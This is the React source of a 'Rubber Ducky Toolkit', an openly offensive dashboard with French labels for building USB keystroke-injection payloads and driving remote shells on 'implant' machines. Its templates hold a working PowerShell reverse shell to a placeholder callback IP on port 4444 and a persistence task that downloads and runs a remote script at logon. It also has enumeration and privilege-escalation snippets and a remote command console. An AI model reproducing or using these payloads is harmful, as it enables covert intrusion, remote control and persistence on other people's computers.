import React, { useState, useEffect } from 'react';
import axios from 'axios';

function App() {
    const [payloads, setPayloads] = useState([]);
    const [implants, setImplants] = useState([
        { id: 'IMP-001', ip: '192.168.1.105', hostname: 'DESKTOP-USER', os: 'Windows 10', status: 'online', last_seen: '2 min' },
        { id: 'IMP-002', ip: '192.168.1.108', hostname: 'LAPTOP-ADMIN', os: 'Windows 11', status: 'online', last_seen: '5 min' },
        { id: 'IMP-003', ip: '192.168.1.110', hostname: 'WORKSTATION', os: 'Windows 10', status: 'offline', last_seen: '2h' }
    ]);
    const [editor, setEditor] = useState('');
    const [selectedImplant, setSelectedImplant] = useState(null);
    const [shellOutput, setShellOutput] = useState('');
    const [activeTab, setActiveTab] = useState('editor');

    // Templates Rubber Ducky puissants
    const templates = {
        reverse_shell: `DELAY 1000
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
ENTER`,

        privilege_escalation: `DELAY 1000
GUI r
DELAY 500
STRING powershell "Start-Process cmd -Verb RunAs -ArgumentList '/c whoami /priv'"
ENTER`,

        persistence: `DELAY 1000
GUI r
DELAY 500
STRING powershell -c "schtasks /create /tn 'WindowsUpdate' /tr 'powershell -c IEX (New-Object Net.WebClient).DownloadString(\"http://YOUR_IP/payload.ps1\")' /sc onlogon /rl highest /f"
ENTER`,

        enum_system: `DELAY 1000
GUI r
DELAY 500
STRING powershell -c "whoami; hostname; [Environment]::OSVersion; Get-WmiObject Win32_ComputerSystem | Select UserName; Get-WmiObject Win32_LogicalDisk | Select Name, @{Name='Size(GB)';Expression={[math]::Round($_.Size/1GB)}}"
ENTER`,

        uac_bypass: `DELAY 1000
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "function Bypass-UAC { If ([System.Diagnostics.Process]::GetCurrentProcess().ProcessName -eq 'powershell') { $NewProcess = New-Object System.Diagnostics.ProcessStartInfo 'powershell' } } Bypass-UAC"
ENTER`
    };

    const compilePayload = async () => {
        try {
            const response = await axios.post('http://localhost:3001/compile', {
                name: 'payload_' + Date.now(),
                payload: editor
            });
            alert('✅ Payload compilé avec succès !');
            setPayloads([...payloads, { name: response.data.path, date: new Date().toLocaleString() }]);
        } catch (e) {
            alert('❌ Erreur compilation: ' + e.message);
        }
    };

    const executeShell = async (command) => {
        if (!selectedImplant) {
            alert('Sélectionnez un implant !');
            return;
        }
        try {
            const response = await axios.post(`http://localhost:3001/shell/${selectedImplant.id}/execute`, {
                command: command
            });
            setShellOutput(prev => prev + `\n$ ${command}\n${response.data.payload}`);
        } catch (e) {
            setShellOutput(prev => prev + `\n❌ Erreur: ${e.message}`);
        }
    };

    return (
        <div className="min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-gray-850 text-white">
            {/* Header */}
            <div className="bg-black/50 border-b border-red-600/30 p-6 sticky top-0 z-50">
                <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                        <span className="text-4xl">🐥</span>
                        <h1 className="text-3xl font-bold">Rubber Ducky Toolkit</h1>
                        <span className="ml-4 px-3 py-1 bg-red-600/20 border border-red-600 rounded-full text-red-400 text-sm">v1.0</span>
                    </div>
                    <div className="text-sm text-gray-400">
                        🟢 {implants.filter(i => i.status === 'online').length} implants actifs
                    </div>
                </div>
            </div>

            {/* Main Content */}
            <div className="p-6">
                <div className="grid grid-cols-3 gap-6">
                    {/* Implants Panel */}
                    <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-4 max-h-screen overflow-y-auto">
                        <h2 className="text-xl font-bold mb-4 border-b border-red-600/30 pb-2">📱 Machines Touchées</h2>
                        <div className="space-y-3">
                            {implants.map(imp => (
                                <div
                                    key={imp.id}
                                    onClick={() => setSelectedImplant(imp)}
                                    className={`p-4 rounded-lg border cursor-pointer transition ${
                                        selectedImplant?.id === imp.id
                                            ? 'bg-red-900/30 border-red-600 shadow-lg shadow-red-600/20'
                                            : 'bg-gray-800/30 border-gray-700 hover:border-red-600/50'
                                    }`}
                                >
                                    <div className="flex items-center justify-between mb-2">
                                        <span className="font-mono text-sm font-bold">{imp.id}</span>
                                        <span className={`px-2 py-1 rounded text-xs font-bold ${
                                            imp.status === 'online' 
                                                ? 'bg-green-900 text-green-300' 
                                                : 'bg-red-900 text-red-300'
                                        }`}>
                                            {imp.status === 'online' ? '🟢 Online' : '🔴 Offline'}
                                        </span>
                                    </div>
                                    <div className="space-y-1 text-xs text-gray-300">
                                        <div><span className="text-gray-400">IP:</span> {imp.ip}</div>
                                        <div><span className="text-gray-400">Host:</span> {imp.hostname}</div>
                                        <div><span className="text-gray-400">OS:</span> {imp.os}</div>
                                        <div><span className="text-gray-400">Vu:</span> {imp.last_seen}</div>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* Main Panel */}
                    <div className="col-span-2 space-y-6">
                        {/* Tabs */}
                        <div className="flex gap-2 border-b border-gray-800">
                            <button
                                onClick={() => setActiveTab('editor')}
                                className={`px-4 py-2 font-bold transition ${
                                    activeTab === 'editor'
                                        ? 'border-b-2 border-red-600 text-red-400'
                                        : 'text-gray-400 hover:text-white'
                                }`}
                            >
                                📝 Payload Editor
                            </button>
                            <button
                                onClick={() => setActiveTab('shell')}
                                className={`px-4 py-2 font-bold transition ${
                                    activeTab === 'shell'
                                        ? 'border-b-2 border-red-600 text-red-400'
                                        : 'text-gray-400 hover:text-white'
                                }`}
                            >
                                💻 Shell Distant
                            </button>
                            <button
                                onClick={() => setActiveTab('payloadstudio')}
                                className={`px-4 py-2 font-bold transition ${
                                    activeTab === 'payloadstudio'
                                        ? 'border-b-2 border-red-600 text-red-400'
                                        : 'text-gray-400 hover:text-white'
                                }`}
                            >
                                🎨 PayloadStudio
                            </button>
                        </div>

                        {/* Payload Editor Tab */}
                        {activeTab === 'editor' && (
                            <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6">
                                <h3 className="text-lg font-bold mb-4">Templates Disponibles</h3>
                                <div className="grid grid-cols-2 gap-2 mb-4">
                                    {Object.keys(templates).map(key => (
                                        <button
                                            key={key}
                                            onClick={() => setEditor(templates[key])}
                                            className="px-3 py-2 bg-gray-800 hover:bg-red-600/20 border border-gray-700 hover:border-red-600 rounded text-sm text-left transition"
                                        >
                                            {key.replace(/_/g, ' ').toUpperCase()}
                                        </button>
                                    ))}
                                </div>
                                <textarea
                                    value={editor}
                                    onChange={(e) => setEditor(e.target.value)}
                                    className="w-full h-64 p-4 bg-gray-950 border border-gray-700 rounded font-mono text-sm text-gray-200 focus:border-red-600 focus:outline-none"
                                    placeholder="Entrez votre code Ducky ici..."
                                />
                                <button 
                                    onClick={compilePayload}
                                    className="w-full bg-gradient-to-r from-red-600 to-red-700 px-6 py-3 rounded mt-4 hover:from-red-500 hover:to-red-600 font-bold transition shadow-lg shadow-red-600/20"
                                >
                                    🔴 Compiler Payload USB
                                </button>
                                <div className="mt-4">
                                    <h4 className="font-bold mb-2">Payloads Compilés</h4>
                                    {payloads.length === 0 ? (
                                        <p className="text-gray-500 text-sm">Aucun payload compilé</p>
                                    ) : (
                                        <div className="space-y-2">
                                            {payloads.map((p, i) => (
                                                <div key={i} className="p-2 bg-gray-800 rounded text-sm">
                                                    <div className="text-green-400">✓ {p.name}</div>
                                                    <div className="text-gray-500 text-xs">{p.date}</div>
                                                </div>
                                            ))}
                                        </div>
                                    )}
                                </div>
                            </div>
                        )}

                        {/* Shell Distant Tab */}
                        {activeTab === 'shell' && (
                            <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6">
                                <h3 className="text-lg font-bold mb-4">
                                    {selectedImplant ? `🔗 Shell: ${selectedImplant.hostname}` : '⚠️ Sélectionnez un implant'}
                                </h3>
                                <div className="mb-4 flex gap-2">
                                    <button 
                                        onClick={() => executeShell('whoami')}
                                        className="px-3 py-2 bg-gray-800 hover:bg-red-600/30 border border-gray-700 rounded text-sm transition"
                                    >
                                        whoami
                                    </button>
                                    <button 
                                        onClick={() => executeShell('ipconfig')}
                                        className="px-3 py-2 bg-gray-800 hover:bg-red-600/30 border border-gray-700 rounded text-sm transition"
                                    >
                                        ipconfig
                                    </button>
                                    <button 
                                        onClick={() => executeShell('Get-Process')}
                                        className="px-3 py-2 bg-gray-800 hover:bg-red-600/30 border border-gray-700 rounded text-sm transition"
                                    >
                                        Get-Process
                                    </button>
                                    <input 
                                        type="text" 
                                        id="customCmd"
                                        placeholder="Commande personnalisée..."
                                        className="flex-1 px-3 py-2 bg-gray-950 border border-gray-700 rounded text-sm focus:border-red-600 focus:outline-none"
                                        onKeyPress={(e) => {
                                            if (e.key === 'Enter') {
                                                executeShell(e.target.value);
                                                e.target.value = '';
                                            }
                                        }}
                                    />
                                </div>
                                <div className="bg-black/80 border border-gray-700 rounded p-4 font-mono text-xs h-64 overflow-y-auto">
                                    {shellOutput ? (
                                        <pre className="text-green-400">{shellOutput}</pre>
                                    ) : (
                                        <p className="text-gray-600">Exécutez une commande pour voir le résultat...</p>
                                    )}
                                </div>
                            </div>
                        )}

                        {/* PayloadStudio Tab */}
                        {activeTab === 'payloadstudio' && (
                            <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6">
                                <h3 className="text-lg font-bold mb-4">🎨 PayloadStudio Generator</h3>
                                <div className="space-y-4">
                                    <div>
                                        <label className="block text-sm font-bold mb-2">Attaque Type</label>
                                        <select className="w-full px-3 py-2 bg-gray-950 border border-gray-700 rounded text-sm focus:border-red-600 focus:outline-none">
                                            <option>Reverse Shell</option>
                                            <option>Privilege Escalation</option>
                                            <option>Data Exfiltration</option>
                                            <option>Persistence</option>
                                            <option>Recon</option>
                                        </select>
                                    </div>
                                    <div>
                                        <label className="block text-sm font-bold mb-2">IP Cible (Callback)</label>
                                        <input type="text" placeholder="192.168.1.x" className="w-full px-3 py-2 bg-gray-950 border border-gray-700 rounded text-sm focus:border-red-600 focus:outline-none" />
                                    </div>
                                    <div>
                                        <label className="block text-sm font-bold mb-2">Port</label>
                                        <input type="text" placeholder="4444" className="w-full px-3 py-2 bg-gray-950 border border-gray-700 rounded text-sm focus:border-red-600 focus:outline-none" />
                                    </div>
                                    <button className="w-full bg-gradient-to-r from-blue-600 to-blue-700 px-6 py-2 rounded font-bold hover:from-blue-500 hover:to-blue-600 transition">
                                        ✨ Générer Payload
                                    </button>
                                </div>
                            </div>
                        )}
                    </div>
                </div>
            </div>
        </div>
    );
}

export default App;